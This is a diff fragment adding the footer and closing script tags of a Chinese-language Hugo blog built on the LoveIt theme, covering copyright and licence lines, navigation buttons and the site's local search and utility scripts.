+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.140.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">gaorenyusi</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.zh.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+</html>
